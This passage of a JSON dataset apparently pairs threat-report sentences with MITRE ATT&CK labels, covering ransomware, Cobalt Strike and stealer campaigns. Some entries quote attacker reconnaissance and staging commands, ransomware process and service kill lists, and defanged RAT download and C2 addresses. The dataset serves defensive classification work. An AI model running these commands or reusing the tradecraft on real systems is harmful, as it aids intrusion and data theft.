    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "On the compromised machine, they use tools such as Mimikatz to dump credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "It collects the victim’s username, computer name, and IP address and sends it to the MuddyWater group.",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This function and all of its fields could also exist and be customized for the HTTP-POST Block (Server communication)### http-get { set uri \"/<URI string>\"; <================ # Specifying the URI to reference in bidirectional communication from client and server set verb \"POST\"; <================ # Setting the verb when requesting available tasks from the C2 server. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We essentially add the team server’s IP address into the proxychains configuration and connect with xfreerdp. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP into the target host using reverse proxy Looking into the generated artifacts, we can see that a 4624 type 3 event is created on the target host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "One interesting aspect that we have also mentioned in similar cases from our reporting is that the victim’s hostname is captured in this logon event as well as the source address being 127.0.0.1. Security Event ID 4624 Type 3 shows the attacker’s hostname Once again, the running Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session via reverse proxy. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "After that, we’ll examine network data associated with lateral movement and the various methods employed by Cobalt Strike operators based on our observations. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP/HTTPS C2 traffic ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At the top half of the screenshot, we show the HTTP communication between the Beacon and the Cobalt Strike server. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Below is the infrastructure that we used for demonstration purposes: Target Host: 192.168.88.179 Internal DNS server: 192.168.88.2 Cobalt Strike C2 domain: infosecppl.store We instructed the Beacon to execute the command systeminfo on the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "192.168.38.102 = SMB Beacon 192.168.38.104 = HTTP Parent Beacon Detecting and Analyzing C2 Traffic Thanks to free, open-source tooling, investigating network traffic has become more accessible.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "File infectors usually call their malicious code very early (e.g., by replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header) before any function calls from external libraries are ever called.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As HTTPS and other protocols built on SSL have become increasingly ubiquitous for accessing resources across the internet, it’s not surprising that malware authors also use this protocol for other things, such as pulling down the next stage of their payload, or C2 communications. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The sample is loaded by a loader written in Delphi, which downloads the next stage from a public file storage service using HTTPS. ",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If we open the recorded package capture in Wireshark and provide the extracted SSL/TLS keys that were extracted by the analysis platform, we should be able to see the SSL encrypted traffic to the public file storage service, including the downloaded data. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For example: Wireshark -r guest_traffic.pcap -o \"ssl.keylog_file:key_capture.keys\" After opening the capture (pcap) in Wireshark, the TLS encrypted data will be decrypted, and we can use the http filter to get the decrypted HTTPS traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "There, the user will be encouraged to download a malicious installer that embeds the Crypter with the payload. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The domains are signed with a certificate (via LetsEncrypt), which enables an HTTPS connection. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Alternatively, its role may be to deceive the user into thinking that the application has failed to execute, even as it silently continues the malicious execution in the background. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Persistency Implementation If the crypter is configured to install persistence, the loader DLL will execute a new thread that loads another DLL (from the compressed files) that will handle this task. Figure 12: New thread creation for calling the persistent mechanism The newly loaded DLL will either use one of the following logics or both of them to implement the persistency: Write a.lnk file in the startup folder that executes the Crypter’s main executable. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 13: .lnk file persistence implementation Write a registry Run key that executes the Crypter’s main executable. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 14: registry run key persistence implementation The Decryption Shellcode The XML file (or any other file type used by the crypter) contains the following components: The first shellcode (referred to in this section). ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Loader Shellcode The purpose of the Loader shellcode is to inject the decrypted payload within the currently running process (itself). ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Within it, the Loader overwrites the current PE with the final payload’s PE.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It does so by copying the PE headers and each section according to the current executable’s base address. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Figure 19: Change headers protection and clear memory bytes for the new PE Once previous bytes have been cleared, the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Correction The final stage is responsible for fixing the import address table and relocation table of the newly injected PE. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the malware jumps to the entry point of the newly injected PE with the original command-line arguments. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The process list checked is as follows: agntsvc, dbeng50, dbsnmp, encsvc, excel, firefox, infopath, isqlplussvc, msaccess, mspub, mydesktopqos, mydesktopservice, notepad, ocautoupds, ocomm, ocssd, onenote, oracle, outlook, powerpnt, sqbcoreservice, sql, steam, synctime, tbirdconfig, thebat, thunderbird, visio, winword, wordpad, xfssvccon, *sql*, bedbh, vxmon, benetns, bengien, pvlsvr, beserver, raw_agent_svc, vsnapvss, CagService, QBIDPService, QBDBMgrN, QBCFMonitorService, SAP, TeamViewer_Service, TeamViewer, tv_w32, tv_x64, CVMountd, cvd, cvfwd, CVODS, saphostexec, saposcol, sapstartsrv, avagent, avscc, DellSystemDetect, EnterpriseClient, VeeamNFSSvc, VeeamTransportSvc, VeeamDeploymentSvc ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The services running on the compromised system are checked against the following list: mepocs, memtas, veeam, svc$, backup, sql, vss, msexchange, sql$, mysql, mysql$, sophos, MSExchange, MSExchange$, WSBExchange, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, GxBlr, GxVss, GxClMgrS, GxCVD, GxCIMgr, GXMMM, GxVssHWProv, GxFWD, SAPService, SAP, SAP$, SAPD$, SAPHostControl, SAPHostExec, QBCFMonitorService, QBDBMgrN, QBIDPService, AcronisAgent, VeeamNFSSvc, VeeamDeploymentService, VeeamTransportSvc, MVArmor, MVarmor64, VSNAPVSS, AcrSch2Svc In an effort to maintain persistence, the BlackCat ransomware excludes key system and application folders – as well as key components – from encryption so as not to render the system and ransomware inoperative.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The credentials also allow BlackCat to move laterally within the victim’s system and/or network, often with administrative privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Credential access permits the ransomware to deploy additional tools that further propagate the attack.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Associated Tools BlackCat has been observed using multiple – often legitimate – tools throughout their attacks, such as Mimikatz, LaZagne and WebBrowserPassView to recover stored passwords, as well as GO Simple Tunnel (GOST) and MEGAsync to exfiltrate data.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These scans can be automated, through Python:registered: scripts, to locate certain files, paths, or vulnerabilities.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The cyber actors can gain valuable information on the victim network, such as the allocated resources, an organization’s fully qualified domain name, IP address space, and open ports to target or exploit. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "These emails may contain a malicious link or files that will provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "[T1078]: Default Accounts [T1078.001] Domain Accounts [T1078.002] Chinese state-sponsored cyber actors have been observed: gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "[T1059.006] JavaScript [T1059.007] Network Device CLI [T1059.008] Chinese state-sponsored cyber actors have been observed: Using cmd.exe, JavaScript/Jscript Interpreter, and network device command line interpreters (CLI). ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Restrict which commands can be used. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command Shell Restrict use to administrator, developer, or power user systems.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "[T1053.005] Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "These emails may contain a malicious link or file that provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "[T1543]: Windows Service [T1543.003] Chinese state-sponsored cyber actors have been observed executing malware shellcode and batch files to establish new services to enable persistence. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "[T1055.002] Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Using shellcode that injects implants into newly created instances of the Service Host process (svchost) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "[D3-EAL] Indicator Removal from Host [T1070] Chinese state-sponsored cyber actors have been observed deleting files using rm or del commands. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "[T1218] Mshta [T1218.005] Rundll32 [T1218.011] Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "[T1003.003] Chinese state-sponsored cyber actors were observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1083] Chinese state-sponsored cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "[D3-SCA] User Behavior Analysis [D3-UBA] Process Discovery [T1057] Chinese state-sponsored cyber actors have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation of Remote Services [T1210] Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actor may then perform actions as the logged-on user. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "[D3-FAPA] Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting [D3-EDL] Clipboard Data [T1115] Chinese state-sponsored cyber actors used RDP and execute rdpclip.exe to exfiltrate information from the clipboard. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Detect: Network Traffic Analysis Remote Terminal Session Detection [D3-RTSD] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Outbound Traffic Filtering [D3-OTF] Data Staged [T1074] Chinese state-sponsored cyber actors have been observed using the mv command to export files into a location, like a compromised Microsoft Exchange, IIS, or emplaced webshell prior to compressing and exfiltrating the data from the target network. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Using malware implants that use the Dropbox:registered: API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive:registered: API. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "[T1105] Chinese state-sponsored cyber actors have been observed importing tools from GitHub or infected domains to victim networks.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The same job.php file also contains a backdoor that executes arbitrary PHP code sent as a POST request parameter “dd1”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For example:./wp-sale-need-wuu.php ./wp-sold-need-xdd.php ./wp-mails-need-lxj.php ./wp-mails-need-wjo.php ./wp-drop-need-baj.php ./wp-working-need-css.php ./wp-locations-need-bot.php ./wp-readmes-need-rfq.php ./wp-track-need-ito.php ./wp-cliff-need-oxy.php ./wp-sale-need-vzw.php ./wp-working-need-bkv.php ./wp-working-need-ygr.php The contents of these files look a little something like this, with slight variations for each:When decoded, a backdoor is revealed:This backdoor executes arbitrary PHP code sent in POST request parameters.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, it also tries to delete the wp-sale.js file created at the same time as the backdoor.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "After gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Command and Control Once Royal actors gain access to the network, they communicate with command and control (C2) infrastructure and download multiple tools [T1105].",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lateral Movement and Persistence Royal actors often use RDP to move laterally across the network",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In one confirmed case, the actors used a legitimate admin account to remotely log on to the domain controller [T1078].",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once on the domain controller, the threat actor deactivated antivirus protocols",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Encryption Before starting the encryption process, Royal actors: Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1] Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to prevent system recovery.[1] FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Batch files create a new admin user [T1078.002], force a group policy update, set pertinent registry keys to auto-extract",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs [T1070.001]. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Similar to the previous activity, GuLoader execution begins with the user clicking on a shortcut file and launching a PowerShell command, which retrieves a decoy tax document and VBS script. ",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Summary of GuLoader's Execution Chain Before stepping through each step in GuLoader’s execution chain in more detail, we can summarize the entire process: Tefor.vbs VBScript is executed by the user clicking a shortcut file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "BitsTransfer is used to retrieve a payload package containing the second stage PowerShell and two shellcode buffers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shellcode B is used to retrieve and inject Remcos RAT into a legitimate Windows process such as ieinstal.exe. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Assigns a variable that checks if the system is 64-bit and if the 32-bit PowerShell exists in the syswow64 folder. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the system is 64-bit and the 32-bit PowerShell exists in the correct path, execute a new 32-bit PowerShell process copying the current process command line as a new argument.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This is likely done to reload PowerShell with the full command line argument but with a 32-bit process required for GuLoader’s shellcode.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 12 Key derived from Shellcode A. Shellcode B Copies 204836 bytes of shellcode from the same payload package beginning at offset 648.Once decoded, this shellcode is responsible for fetching Remcos RAT from hxxp://194.55.224[.]183/frsh/iFaeETTILhlw208.bin and injecting it into ieinstall.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Recent GuLoader campaigns employ a topical tax-themed lure as a way of enticing users to click on malicious shortcut files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Our investigations revealed that the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&C) server. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Both Mallox and Fargo variants use a set of tools via remote desktop for defense evasion. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Our investigations showed that the gang used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We also observed the presence of YDArk.exe (PCHunter64) for performing rootkit behaviors, and that TargetCompany attempts to terminate security-related processes and services by dropping KILLAV. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, the ransomware drops a batch file named killer.bat that terminates various services and applications, including GPS-related services.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Afterward, it proceeds to steal system information like machine details and other relevant data. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The malware implemented a series of Mimikatz modifications on closed-source tooling.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These techniques include in-memory mapping of malicious images to evade EDR API hooks and file-based detections surgically terminating Event Log threads instead of the host process to inhibit logging without raising suspicions staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used C:\\MS_DATA as their main working directory for storing malware and staging data for exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, the attackers used dsquery and query to obtain information about Active Directory objects, including user information, and Remote Desktop user sessions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "\"cmd\" /c cd /d C:\\MS_DATA\\&dsquery * -limit 0 -filter \"cmd\" /c cd /d",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "-attr objectSID sAMAccountName displayName mail memberOf >da.back&cd \"cmd\" /c cd /d c:\\windows\\system32\\inetsrv\\&query user&cd \"cmd\" /c cd /d",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The attackers then check connectivity with both the Internet and specific local machines of interest. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"cmd\" /c cd /d",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "c:\\windows\\system32\\inetsrv\\&ping 8.8.8.8 -n 1&cd \"cmd\" /c cd /d",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "[IP ADDRESS/HOSTNAME]&cd They also retrieve networking information, like network adapters, specific machines, and network services like Remote Desktop Protocol (RDP). ",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"cmd\" /c cd /d C:\\MS_DATA\\&ipconfig",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "/all&cd \"cmd\" /c cd /d",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "c:\\windows\\system32\\inetsrv\\&net use&cd \"cmd\" /c cd /d",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "c:\\windows\\system32\\inetsrv\\&netstat.exe -nob \"cmd\" /c cd /d c:\\windows\\system32\\inetsrv\\&netstat -aon |find \"3389\"&cd \"cmd\" /c cd /d C:\\MS_DATA\\&netstat -aon |find \"[IP ADDRESS]\"&cd ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor made use of the native makecab tool to compress information gathered for exfiltration. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"cmd\" /c cd /d C:\\MS_DATA\\&makecab da.back d.zip >1.txt&cd For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "[PASSWORD] /u:[DOMAIN]\\[USERNAME] A Penchant for Credential Theft ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In order to steal credentials, the attackers employ custom modified versions of Mimikatz, including an executable named pc.exe. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz publicly available code (top); strings from a Mimikatz modification (bottom)The pc.exe executable stages the execution of three other components that ultimately result in stealing credentials from the Local Security Authority Subsystem Service (LSASS) process. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This allows mim221 to inspect and extract credentials from the LSASS process. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disabling Windows event logging in an attempt to evade detection; and Injecting pc.dll into LSASS as a Security Package.",
    "command": "",
    "labels": [
      "T1055",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Security Packages are used to extend the Windows authentication mechanism and can be abused to execute malicious code in the context of LSASS. ",
    "command": "",
    "labels": [
      "T1055",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This is achieved by locating the process that hosts the Event Log, enumerating the processes’ threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Querying service tag informationAddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "getHashFlsa64.dll accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file named pc.log for later exfiltration. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, the implementation of AddSecurityPackage64.dll looks like an adaptation of public code that demonstrates injection of a Security Package into LSASS using RPC calls. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This includes deploying webshells at Microsoft Exchange servers for establishing an initial foothold, following same file naming conventions, using the LG tool and the net, query, and tasklist Windows built-in tools for gathering user and process information, and the PsExec Windows Sysinternals tool and net for lateral movement and exploration, respectively. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "By pivoting on the original filename of mim221’s getHashFlsa64.dll, we observed another sample that steals credentials from LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Valid credentials found during compromise are then uploaded to the command-and-control (C&C) server, usually at port 5028/TCP. Figure 4.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "By: Aliakbar Zahravi, Peter Girnus February 09, 2023Read time: ( words) Save to Folio Subscribe We recently found an active campaign that uses a fake employment pretext targeting Eastern Europeans in the cryptocurrency industry to install an information stealer.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Stealerium, the original information stealer which serves as the base for Enigma Stealer, is an open-source project written in C# and markets itself as a stealer, clipper, and keylogger with logging capabilities using the Telegram API.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This file, which also masquerades as a legitimate word document, is designed to lure unsuspecting victims into executing the loader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The first utilizes Telegram for delivering payloads, sending commands, and receiving the payload heartbeat.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This server registers a newly infected host when Interview conditions.word.exe is executed by the victim. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Its primary objective is to download, deobfuscate, decompress, and launch the secondary stage payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Windows API offers LoadLibrary and GetProcAddress functions to facilitate this.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the malware creates the mutual exclusion object (mutex) to mark its presence in the system and retrieves the MachineGuid of the infected system from the SOFTWARE\\Microsoft\\Cryptography\\MachineGuid registry key, which it uses as a unique identifier to register the system with its C&C server and track its infection. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Constructing a unique system identifier and creating a mutex It then deletes the HKCU\\SOFTWARE\\Intel registry key and recreates it with two values, HWID and ID, as shown in Figure 13. Figure 13.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Recreating HKCU\\SOFTWARE\\Inte It then collects information about the .NET Framework Setup on the infected system and sends it to its C&C server as shown in Figure 14. Figure 14.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The first one ,193[.]56[.]146[.]29, is used to send program execution DEBUG and Telegram to deliver payloads and send commands. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Successful payload retrieval debug message To decompress the payload, the malware uses Microsoft Cabinet's Compressapi with the compression algorithm (\"COMPRESS_RAW | COMPRESS_ALGORITHM_LZMS\").",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the malware executes an export function called \"Entry\" from UpdateTask.dll via rundll32.exe as shown in Figure 23. Figure 23.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Running the stage 2 payload through rundll32.exe Stage 2: EngimaDownloader_s002 MD5 SHA-1 SHA-256 File size 377f617ccd4aa09287d5221d5d8e1228 288358deaa053b30596100c9841a7d6d1616908d f1623c2f7c00affa3985cf7b9cdf25e39320700fa9d69f9f9426f03054b4b712 497.50 KB (509440 bytes) ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The primary objective of this malware is to disable Microsoft Defender by deploying a malicious kernel mode driver (“bring your own vulnerable driver” or BYOVD method) via exploiting a vulnerable Intel driver (CVE-2015-2291) and then downloading and executing the third-stage payload. ",
